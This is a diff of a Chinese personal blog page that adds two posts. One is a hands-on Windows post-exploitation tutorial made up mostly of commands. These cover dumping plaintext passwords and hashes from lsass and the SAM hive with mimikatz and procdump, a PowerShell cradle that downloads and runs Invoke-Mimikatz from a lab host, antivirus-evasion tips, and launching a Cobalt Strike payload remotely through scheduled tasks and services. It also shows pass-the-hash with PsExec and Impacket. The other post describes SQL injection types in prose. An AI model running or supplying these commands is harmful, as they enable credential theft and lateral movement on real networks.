@@ -191,6 +191,294 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://www.jwmz.net/2021/09/14/%E8%8E%B7%E5%8F%96%E5%AF%86%E7%A0%81hash/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/IMG_0640.PNG">
+      <meta itemprop="name" content="JWMZ">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="JWMZ`Blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2021/09/14/%E8%8E%B7%E5%8F%96%E5%AF%86%E7%A0%81hash/" class="post-title-link" itemprop="url">获取密码hash</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2021-09-14 23:59:47 / 修改时间：00:26:41" itemprop="dateCreated datePublished" datetime="2021-09-14T23:59:47+08:00">2021-09-14</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E5%86%85%E7%BD%91/" itemprop="url" rel="index"><span itemprop="name">内网</span></a>
+                </span>
+            </span>
+
+          
+            <span id="/2021/09/14/%E8%8E%B7%E5%8F%96%E5%AF%86%E7%A0%81hash/" class="post-meta-item leancloud_visitors" data-flag-title="获取密码hash" title="阅读次数">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span class="leancloud-visitors-count"></span>
+            </span>
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="far fa-comment"></i>
+      </span>
+      <span class="post-meta-item-text">Valine：</span>
+    
+    <a title="valine" href="/2021/09/14/%E8%8E%B7%E5%8F%96%E5%AF%86%E7%A0%81hash/#valine-comments" itemprop="discussionUrl">
+      <span class="post-comments-count valine-comment-count" data-xid="/2021/09/14/%E8%8E%B7%E5%8F%96%E5%AF%86%E7%A0%81hash/" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  <br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>2.5k</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>2 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h2 id="获取明文密码"><a href="#获取明文密码" class="headerlink" title="获取明文密码"></a>获取明文密码</h2><ul>
+<li><p>系统版本小于windows 8 &amp; windows server 2012才能读明文密码</p>
+</li>
+<li><p>windows 8 &amp; windows server 2012及以上需要修改注册表，开启存储明文密码功能，并重新登录系统，才能读取到明文密码。</p>
+</li>
+</ul>
+<h3 id="mimikatz"><a href="#mimikatz" class="headerlink" title="mimikatz"></a>mimikatz</h3><p>使用mimikatz.exe在lsass.exe进程中读取明文密码</p>
+<p>上传mimikatz到目标服务器</p>
+<p><img src="/2021/09/14/%E8%8E%B7%E5%8F%96%E5%AF%86%E7%A0%81hash/clip_image001.png" alt="img"></p>
+<p>当前目录执行：</p>
+<p><code>mimikatz.exe &quot;privilege::debug&quot; &quot;sekurlsa::logonPasswords full&quot; &quot;exit&quot;</code></p>
+<p>正常执行后显示</p>
+<p><img src="/2021/09/14/%E8%8E%B7%E5%8F%96%E5%AF%86%E7%A0%81hash/clip_image002.png" alt="img"></p>
+<p>Powershell版mimikatz.ps1</p>
+<h4 id="本地执行："><a href="#本地执行：" class="headerlink" title="本地执行："></a>本地执行：</h4><p><code>powershell Get-ExecutionPolicy</code>               //查看状态是否允许运行脚本</p>
+<p><img src="/2021/09/14/%E8%8E%B7%E5%8F%96%E5%AF%86%E7%A0%81hash/clip_image003.png" alt="img"></p>
+<p><code>powershell Set-ExecutionPolicy Unrestricted</code>      //设置为允许所有的脚本运行</p>
+<p><img src="/2021/09/14/%E8%8E%B7%E5%8F%96%E5%AF%86%E7%A0%81hash/clip_image004.png" alt="img"></p>
+<p> <code>powershell Import-Module .\Invoke-Mimikatz.ps1;Invoke-Mimikatz -Command &#39;&quot;privilege::debug&quot; &quot;sekurlsa::logonPasswords&quot;&#39;</code>       //获取密码</p>
+<p><img src="/2021/09/14/%E8%8E%B7%E5%8F%96%E5%AF%86%E7%A0%81hash/clip_image005.png" alt="img"></p>
+<h4 id="本地执行-绕过执行权限限制"><a href="#本地执行-绕过执行权限限制" class="headerlink" title="本地执行(绕过执行权限限制)"></a>本地执行(绕过执行权限限制)</h4><p><code>powershell -exec bypass &quot;Import-Module .\Invoke-Mimikatz.ps1;Invoke-Mimikatz -Command &#39;privilege::debug&quot; &quot;sekurlsa::logonPasswords&#39;&quot;</code></p>
+<p><img src="/2021/09/14/%E8%8E%B7%E5%8F%96%E5%AF%86%E7%A0%81hash/clip_image006.png" alt="img"></p>
+<h4 id="远程执行"><a href="#远程执行" class="headerlink" title="远程执行"></a>远程执行</h4><p>开启目标机能访问到的web服务</p>
+<p>例如：<code>php -S 0.0.0.0:6666</code></p>
+<p><code>powershell.exe iex (New-Object Net.webclient).DownloadString(&#39;http://192.168.21.93:6666/Invoke-Mimikatz.ps1&#39;); Invoke-Mimikatz</code></p>
+<p><img src="/2021/09/14/%E8%8E%B7%E5%8F%96%E5%AF%86%E7%A0%81hash/clip_image008.png" alt="img"></p>
+<p>使用procdump.exe 保存lsass.exe内存数据</p>
+<p>上传procdump.exe到目标服务器</p>
+<p><code>procdump.exe -accepteula -ma lsass.exe lsass.dmp</code></p>
+<p><img src="/2021/09/14/%E8%8E%B7%E5%8F%96%E5%AF%86%E7%A0%81hash/clip_image009.png" alt="img"></p>
+<p>将dmp文件下载到本地使用mimikatz读取明文密码</p>
+<p><img src="/2021/09/14/%E8%8E%B7%E5%8F%96%E5%AF%86%E7%A0%81hash/clip_image010.png" alt="img"></p>
+<p> mimikatz默认不免杀，cs上线后可以使用cs自带的免杀mimikatz</p>
+<p>cs中执行：<code>logonpasswords</code></p>
+<p><img src="/2021/09/14/%E8%8E%B7%E5%8F%96%E5%AF%86%E7%A0%81hash/clip_image011.png" alt="img"></p>
+<h2 id="获取密码hash"><a href="#获取密码hash" class="headerlink" title="获取密码hash"></a>获取密码hash</h2><h3 id="注册表导出sam文件"><a href="#注册表导出sam文件" class="headerlink" title="注册表导出sam文件"></a>注册表导出sam文件</h3><p><code>reg save hklm\sam sam.bak</code></p>
+<p><code>reg save hklm\system system.bak</code></p>
+<p><code>reg save hklm\security security.bak</code></p>
+<p><img src="/2021/09/14/%E8%8E%B7%E5%8F%96%E5%AF%86%E7%A0%81hash/clip_image012.png" alt="img"></p>
+<p>将导出的三个文件保存到本地，使用mimikatz读取hash</p>
+<p><code>mimikatz.exe &quot;lsadump::sam /sam:sam.bak /system:system.bak&quot; &quot;exit&quot;</code></p>
+<p><img src="/2021/09/14/%E8%8E%B7%E5%8F%96%E5%AF%86%E7%A0%81hash/clip_image013.png" alt="img"></p>
+<p>注册表导出sam文件到本地可以免杀</p>
+<h3 id="Get-PassHashes-ps1读取hash"><a href="#Get-PassHashes-ps1读取hash" class="headerlink" title="Get-PassHashes.ps1读取hash"></a>Get-PassHashes.ps1读取hash</h3><h4 id="本地读取"><a href="#本地读取" class="headerlink" title="本地读取"></a>本地读取</h4><p><code>powershell -exec bypass &quot;Import-Module .\Get-PassHashes.ps1;Get-PassHashes&quot;</code></p>
+<p><img src="/2021/09/14/%E8%8E%B7%E5%8F%96%E5%AF%86%E7%A0%81hash/clip_image014.png" alt="img"></p>
+<h4 id="远程读取"><a href="#远程读取" class="headerlink" title="远程读取"></a>远程读取</h4><p><code>powershell &quot;IEX (New-Object Net.WebClient).DownloadString(&#39;http://192.168.21.93:6666/Get-PassHashes.ps1&#39;);Get-PassHashes&quot;</code></p>
+<p><img src="/2021/09/14/%E8%8E%B7%E5%8F%96%E5%AF%86%E7%A0%81hash/clip_image015.png" alt="img"></p>
+<p> 使用cs中 hashdump 可以免杀</p>
+<p><img src="/2021/09/14/%E8%8E%B7%E5%8F%96%E5%AF%86%E7%A0%81hash/clip_image016.png" alt="img"></p>
+<h2 id="明文传递"><a href="#明文传递" class="headerlink" title="明文传递"></a>明文传递</h2><p>使用windows自带net use命令</p>
+<p><code>net use \\192.168.21.224\ipc$ 123.com /user:administrator</code></p>
+<p><img src="/2021/09/14/%E8%8E%B7%E5%8F%96%E5%AF%86%E7%A0%81hash/clip_image017.png" alt="img"></p>
+<p>复制文件到目标服务器</p>
+<p><img src="/2021/09/14/%E8%8E%B7%E5%8F%96%E5%AF%86%E7%A0%81hash/clip_image018.png" alt="img"></p>
+<p>查看目标服务器时间</p>
+<p><code>net time \\192.168.21.224</code></p>
+<h3 id="使用计划任务执行cs-exe"><a href="#使用计划任务执行cs-exe" class="headerlink" title="使用计划任务执行cs.exe"></a>使用计划任务执行cs.exe</h3><p><code>at \\192.168.21.224 20:31 c:\cs.exe</code></p>
+<p><img src="/2021/09/14/%E8%8E%B7%E5%8F%96%E5%AF%86%E7%A0%81hash/clip_image019.png" alt="img"></p>
+<h3 id="高版本windows中schtasks替换at"><a href="#高版本windows中schtasks替换at" class="headerlink" title="高版本windows中schtasks替换at"></a>高版本windows中schtasks替换at</h3><p>创建计划任务</p>
+<p><code>schtasks /s 192.168.21.224 /create /sc once /f /tn note /TR c:\windows\cs.exe /st 20:35:00</code></p>
+<p>查看计划任务</p>
+<p><code>schtasks /s 192.168.21.224 /query /tn note</code></p>
+<p>删除计划任务</p>
+<p><code>schtasks /s 192.168.21.224 /delete /tn note /f</code></p>
+<h3 id="使用sc命令创建服务启动cs-exe"><a href="#使用sc命令创建服务启动cs-exe" class="headerlink" title="使用sc命令创建服务启动cs.exe"></a>使用sc命令创建服务启动cs.exe</h3><p><code>sc \\192.168.21.224 create shell binpath= c:\cs.exe start= auto</code></p>
+<p><img src="/2021/09/14/%E8%8E%B7%E5%8F%96%E5%AF%86%E7%A0%81hash/clip_image020.png" alt="img"></p>
+<p>启动服务</p>
+<p><code>sc \\192.168.21.224 start shell</code></p>
+<p><img src="/2021/09/14/%E8%8E%B7%E5%8F%96%E5%AF%86%E7%A0%81hash/clip_image021.png" alt="img"></p>
+<p>cs正常上线</p>
+<p><img src="/2021/09/14/%E8%8E%B7%E5%8F%96%E5%AF%86%E7%A0%81hash/clip_image022.png" alt="img"></p>
+<h2 id="Hash传递"><a href="#Hash传递" class="headerlink" title="Hash传递"></a>Hash传递</h2><h4 id="使用mimikatz-exe通过密码hash创建连接"><a href="#使用mimikatz-exe通过密码hash创建连接" class="headerlink" title="使用mimikatz.exe通过密码hash创建连接"></a>使用mimikatz.exe通过密码hash创建连接</h4><p><code>mimikatz.exe &quot;sekurlsa::pth /domain:192.168.21.224 /user:administrator /ntlm:afffeba176210fad4628f0524bfe1942&quot; &quot;exit&quot;</code></p>
+<p>弹出cmd窗口</p>
+<p><img src="/2021/09/14/%E8%8E%B7%E5%8F%96%E5%AF%86%E7%A0%81hash/clip_image023.png" alt="img"></p>
+<h3 id="微软pstools"><a href="#微软pstools" class="headerlink" title="微软pstools"></a>微软pstools</h3><p>已建立连接<code>net use \\192.168.21.224\ipc$ 123.com /user:administrator</code></p>
+<p>直接执行命令</p>
+<p><code>PsExec64 -accepteula \\192.168.21.224 whoami</code></p>
+<p><img src="/2021/09/14/%E8%8E%B7%E5%8F%96%E5%AF%86%E7%A0%81hash/clip_image024.png" alt="img"></p>
+<p>未创建连接</p>
+<p><code>PsExec -accepteula \\192.168.21.224 -u administrator -p 123.com -s cmd</code></p>
+<p>返回cmd</p>
+<p><img src="/2021/09/14/%E8%8E%B7%E5%8F%96%E5%AF%86%E7%A0%81hash/clip_image025.png" alt="img"></p>
+<h3 id="Impacket"><a href="#Impacket" class="headerlink" title="Impacket"></a>Impacket</h3><p>支持hash传递</p>
+<p><code>psexec -hashes 00000000000000000000000000000000:afffeba176210fad4628f0524bfe1942 administrator@192.168.21.224 cmd</code></p>
+<p>返回cmd</p>
+<p><img src="/2021/09/14/%E8%8E%B7%E5%8F%96%E5%AF%86%E7%A0%81hash/clip_image026.png" alt="img"></p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://www.jwmz.net/2021/08/02/sql%E6%B3%A8%E5%85%A5/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/IMG_0640.PNG">
+      <meta itemprop="name" content="JWMZ">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="JWMZ`Blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2021/08/02/sql%E6%B3%A8%E5%85%A5/" class="post-title-link" itemprop="url">sql注入</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2021-08-02 22:00:42 / 修改时间：22:30:34" itemprop="dateCreated datePublished" datetime="2021-08-02T22:00:42+08:00">2021-08-02</time>
+            </span>
+
+          
+            <span id="/2021/08/02/sql%E6%B3%A8%E5%85%A5/" class="post-meta-item leancloud_visitors" data-flag-title="sql注入" title="阅读次数">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span class="leancloud-visitors-count"></span>
+            </span>
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="far fa-comment"></i>
+      </span>
+      <span class="post-meta-item-text">Valine：</span>
+    
+    <a title="valine" href="/2021/08/02/sql%E6%B3%A8%E5%85%A5/#valine-comments" itemprop="discussionUrl">
+      <span class="post-comments-count valine-comment-count" data-xid="/2021/08/02/sql%E6%B3%A8%E5%85%A5/" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  <br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>605</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>1 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="sql注入是什么？"><a href="#sql注入是什么？" class="headerlink" title="sql注入是什么？"></a>sql注入是什么？</h1><p>sql注入就是在有数据库查询的地方，使用特殊的sql语句，利用数据库的特性，构造出不一样的查询结果。</p>
+<h1 id="sql注入产生的原因："><a href="#sql注入产生的原因：" class="headerlink" title="sql注入产生的原因："></a>sql注入产生的原因：</h1><p>web应用对用户可以控制的输入内容，未进行过滤，或未进行完全过滤，使用户输入的特殊sql语句被带入到数据库中执行了，就造成了sql注入。</p>
+<h1 id="sql注入的分类："><a href="#sql注入的分类：" class="headerlink" title="sql注入的分类："></a>sql注入的分类：</h1><p>由于各个web应用不同的情况，查询数据的方式就有了区别，简单可以分为几类，联合查询注入，报错注入，bool盲注，时间盲注。</p>
+<h2 id="联合查询注入："><a href="#联合查询注入：" class="headerlink" title="联合查询注入："></a>联合查询注入：</h2><p>使用union关键字，构造叠加查询的语句，需要页面要有数据查询的回显点，是几种查询中最方便快捷的。</p>
+<h2 id="报错注入："><a href="#报错注入：" class="headerlink" title="报错注入："></a>报错注入：</h2><p>利用数据库的特性，故意使数据库中的函数或者类型转换时发生错误，将数据库的报错信息发送到页面，并带出我们要查询的结果，需要页面能显示数据库的报错信息。</p>
+<h2 id="bool注入："><a href="#bool注入：" class="headerlink" title="bool注入："></a>bool注入：</h2><p>bool注入是在页面没有显示位，并且不会将数据库的报错信息显示到页面上时使用的，这样就不能直接看到查询的结果，只能通过对或错来判断数据，条件为真时，页面显示正常，条件为假时，页面显示不正常，查询效率比较低，但适用性比较广。</p>
+<h2 id="时间盲注："><a href="#时间盲注：" class="headerlink" title="时间盲注："></a>时间盲注：</h2><p>时间盲注就是在bool盲注不能通过页面显示是否正常来判断查询结果时，使用当条件为真时，使数据库查询时间延长一定时间，当条件为假时，马上返回查询结果，时间盲注的效率最低，通常每个字符使用二分法都要判断多次，但也是适用性最广的，其他方式都不能用时，可以考虑编写脚本自动执行时间盲注。</p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
     <link itemprop="mainEntityOfPage" href="https://www.jwmz.net/2021/06/27/hexo+github%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -598,14 +886,14 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">3</span>
+          <span class="site-state-item-count">5</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
       <div class="site-state-item site-state-categories">
             <a href="/categories/">
           
-        <span class="site-state-item-count">2</span>
+        <span class="site-state-item-count">3</span>
         <span class="site-state-item-name">分类</span></a>
       </div>
   </nav>
@@ -654,13 +942,13 @@
       <i class="fa fa-chart-area"></i>
     </span>
       <span class="post-meta-item-text">站点总字数：</span>
-    <span title="站点总字数">4k</span>
+    <span title="站点总字数">7k</span>
     <span class="post-meta-divider">|</span>
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
       <span class="post-meta-item-text">站点阅读时长 &asymp;</span>
-    <span title="站点阅读时长">3 分钟</span>
+    <span title="站点阅读时长">6 分钟</span>
 </div>
 
 <!-- 网站运行时间的设置 -->
